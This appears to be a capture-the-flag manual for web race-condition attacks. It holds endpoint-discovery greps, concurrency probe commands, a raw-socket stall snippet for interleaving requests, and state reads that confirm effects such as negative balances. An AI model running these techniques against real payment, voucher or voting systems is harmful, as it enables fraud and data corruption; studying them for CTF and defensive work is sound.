# Field manual deep — the exhaustive operational reference

The expanded how-to: every command, every branch, every read, every record —
the print-and-work reference for a full engagement.

---

## 0. Setup and contract

```bash
export BASE="https://target.ctf"
export SESSION="session=your-cookie"
export NAME="challenge-name"
export CODE="YOUR-OWNED-CODE"       # your resource — never shared/demo
export ACCT="you@yourdomain"
```

Pre-flight: reachable target, owned object, fresh one-shot (SSOS rule),
`--write-ack` understood.

## 1. Inventory — every writable endpoint

```bash
# from the bundle
python3 tools/web/bundle_miner.py --url "$BASE" --out /tmp/bundle 2>/dev/null
grep -rhoE '"/(api/)?[a-z0-9_/-]+"' /tmp/bundle | sort -u | grep -iE \
  '(redeem|buy|vote|transfer|withdraw|verify|book|claim|register|order|reset|invite|pay|use|spin|join|bid|convert|refund|accept|submit|apply|exchange|enroll|share|report|export|delete|follow)'

# from source — every route
grep -rnE '(@(app|router|bp)\.(post|put|patch|delete)|path\(|Route::|urlpatterns|\.route\()' "$SRC" | grep -vE '(test|spec|mock)'
```

Rank: money → token → account → limit → vote → counter.

## 2. Window audit — the four steps per endpoint

```bash
# read+write on the same record with work between
grep -rnE '(SELECT|\.get\(|findOne|QueryRow|objects\.get|em\.find)' "$SRC" -A 12 \
  | grep -B4 -A8 -E '(UPDATE|INSERT|DELETE|commit|save|flush|Exec|send|email|render|fetch|notify|persist|update!)'
```

For each pair: same record? work between? atomic or constraint-backed?

## 3. The defence audit — the falsifier grep

```bash
grep -rnE '(FOR UPDATE|FOR NO KEY|select_for_update|with_for_update|PESSIMISTIC|SERIALIZABLE|UNIQUE|PRIMARY KEY|CHECK|findOneAndUpdate|ConditionExpression|updateMany|update_all|update_counters|F\(|O_EXCL|SKIP LOCKED|NOWAIT|pg_advisory|GET_LOCK|WATCH|version.*column|row_version|lock_version)' "$SRC"
```

| Found | Action |
|---|---|
| atomic `UPDATE ... WHERE` + rowcount | falsifier — record, next endpoint |
| `FOR UPDATE`/`select_for_update`/`PESSIMISTIC` | falsifier |
| `UNIQUE`/`CHECK`/PK | falsifier |
| SERIALIZABLE + retry | falsifier |
| datastore-atomic (`findOneAndUpdate`/`ConditionExpression`/`WATCH`/`IF`) | falsifier |
| `version` col | falsifier for same-row; still check write-skew |
| advisory lock scoped read→commit | falsifier |
| `SKIP LOCKED` / idempotent worker | falsifier for the queue |
| single worker + private DB | falsifier for HTTP layer |
| transaction alone | **not** a falsifier — proceed |

## 4. The baseline

```bash
python3 tools/web/race_probe.py --url "$BASE/api/<ep>" \
  --method POST --body '<b>' -H 'Cookie: <s>' \
  --baseline-count 5 --count 0 --no-barrier --challenge "$NAME"
```

The serial set — `[200, 409, 409, 409]` for a single-use code.

## 5. The raced run

```bash
python3 tools/web/race_probe.py --url "$BASE/api/<ep>" \
  --method POST --body '<b>' -H 'Cookie: <s>' \
  --concurrency N --count N --baseline-count 5 \
  --signature-mode <m> --write-ack --challenge "$NAME"
```

`--concurrency` = the worker-pool ceiling, not a big number.

## 6. The two-request form

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/<ep-a>"  --method POST --body '<b-a>' -H 'Cookie: <s>' \
  --url-b "$BASE/<ep-b>" --method-b POST --body-b '<b-b>' \
  --concurrency 2 --count 10 --baseline-count 4 \
  --signature-mode normalized-body --write-ack --challenge "$NAME"
```

## 7. The interleave — raw-socket stall

```python
import socket, ssl
ctx = ssl.create_default_context()

def prime(req_head):
    s = ctx.wrap_socket(socket.create_connection((HOST,443)), server_hostname=HOST)
    s.sendall(req_head)      # all but the last body byte
    return s

A = prime(A_head)             # in-flight, last byte withheld
B = ctx.wrap_socket(socket.create_connection((HOST,443)), server_hostname=HOST)
B.sendall(B_full)             # commits inside A's window
A.sendall(A_last_byte)        # release — A re-reads and commits
```

## 8. The state read

```bash
# the crossed state — read the STATE, not the status
curl -s -b "$SESSION" "$BASE/api/account" | grep -oE '"balance":-?[0-9.]+'
curl -s -b "$SESSION" "$BASE/api/inventory" | python3 -m json.tool | grep -c item
curl -s "$BASE/api/post/1" | grep -oE '"score":[0-9]+'
curl -s -b "$SESSION" "$BASE/api/order/1" | python3 -m json.tool | grep -iE '(total|items)'
```

## 9. The result-decision

```text
max_in_flight = 1         → inconclusive — fix delivery, re-roll
max_in_flight ≥ 2 + cross → confirms — attribute, verify, record
real overlap, all-loser   → falsifier — record, move endpoint
429/403 dominant          → throttled — race limiter or interleave
timeout on a slot         → unknown — discard, re-roll
IntegrityError on loser   → falsifier — the constraint fired
```

## 10. Verify the effect pays

```bash
curl -s -b "$SESSION" -X POST "$BASE/api/buy" -d '{"item":"flag_item"}'
curl -s -b "$SESSION" -X POST "$BASE/api/login" -d '{"email":"<fixed>","password":"<yours>"}'
curl -s -b "$SESSION" "$BASE/api/order/1"
curl -s -b "$SESSION" "$BASE/api/me" | grep verified
```

## 11. Record

```bash
python3 tools/hooks.py post-probe "$NAME" --class web-race-condition \
  --hypothesis-id <h> --verdict confirms --evidence-kind impact \
  --evidence "raced [200×2,409×18] vs baseline [200,409×4], max_in_flight=20; GET /api/account balance=-100" \
  --response "<tool output + state read>"
```

## 12. Re-roll

```bash
# restore state between rolls
python3 tools/web/race_probe.py --url "$BASE/api/<ep>" \
  --reset-url "$BASE/api/dev/reset" --reset-method POST --reset-body '{"code":"fresh"}' \
  --concurrency N --count N --baseline-count 3 --write-ack --challenge "$NAME"
```

## 13. Abort / escalate

```text
max_in_flight can't exceed 1      → the layer can't overlap — race the DB/worker layer
3 clean real-overlap no-cross     → falsifier — move endpoint
a one-shot target already used    → stop — unrecoverable
budget out                        → decide.py escalate; --strategy-used per rung
```

## 14. The signature-mode picker

```bash
--signature-mode status            # win/loss differ in status
--signature-mode status-length     # status same, length differs
--signature-mode raw-body          # a second token/cookie in the body
--signature-mode normalized-body   # strip timestamps/ids
--signature-mode regex --signature-regex 'token=([a-z0-9]+)'
--signature-header Set-Cookie      # a second session cookie
--signature-header Location        # a redirect target
--signature-bytes 200              # only the first N bytes
```

## 15. The concurrency ladder

```bash
--concurrency 2  --count 10   # the --url-b interleave pairs
--concurrency 5  --count 5    # a narrow window
--concurrency 10 --count 10   # medium
--concurrency 20 --count 20   # default burst
--concurrency 50 --count 50   # wide window / many workers — watch the ceiling
--baseline-count 5            # always — the serial calibration
```

## 16. The ledger + kill-map writes

```bash
python3 tools/state.py "$NAME" --note "redeem: atomic UPDATE rowcount, raced 3×, falsifier"
# kill-map for an unsolved challenge → knowledge/attempts/<name>.json
```

## 17. The escalate rungs

```text
chain_match → reclassify → writeup_search → novel_plan → fanout_sweep → solver_handoff
record each: python3 tools/state.py "$NAME" --strategy-used <rung>
```

## 18. The one-page flow

```text
contract → inventory → window → falsifier → baseline → race → max_in_flight →
split → state → attribute → verify → record → re-roll / falsify / escalate
```
